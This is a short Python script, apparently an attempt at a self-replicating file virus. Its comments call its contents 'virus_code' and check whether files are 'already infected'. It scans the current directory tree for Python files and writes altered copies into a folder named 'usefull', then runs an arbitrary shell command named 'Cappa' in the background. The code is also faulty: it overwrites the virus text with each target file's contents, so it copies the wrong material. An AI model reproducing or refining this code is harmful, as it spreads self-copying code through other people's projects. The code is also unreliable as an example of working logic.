# BEGIN HEADER
import os
import subprocess

def get_code():
    with open(__file__, "r") as f:
        lines = f.readlines()
    virus_code = [] # initialize code as an empty list
    for line in lines:
        if line == "# BEGIN HEADER\n":
            virus_code.append(line)
        elif line == "# END HEADER\n":
            virus_code.append(line)
            break
        else:
            virus_code.append(line)
    return "".join(virus_code)

def find_files_to_alter():
    files_to_alter = []
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith(".py"):
                files_to_alter.append(os.path.join(root,file))
    return files_to_alter

def alter_files(files_to_alter, num_copies, folder_name):
    code = get_code()
    for file in files_to_alter:
        with open(file,"r") as f:
            code = f.read()
        if "# BEGIN HEADER" not in code and "# END HEADER" not in code: # check if the file is already infected
            os.makedirs(folder_name, exist_ok=True) # create the folder if it does not exist
            for i in range(num_copies):
                new_file = os.path.join(folder_name,os.path.basename(file) + str(i) + ".py")
                with open(new_file,"w") as f:
                    f.write(code + "\n" + code) # write the virus code and the original code to the new file
                print("Copied to " + new_file)

def background_processes():
    command = "Cappa"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process
alter_files(find_files_to_alter(), 1, "usefull") # change these values as needed
background_processes()
# END HEADER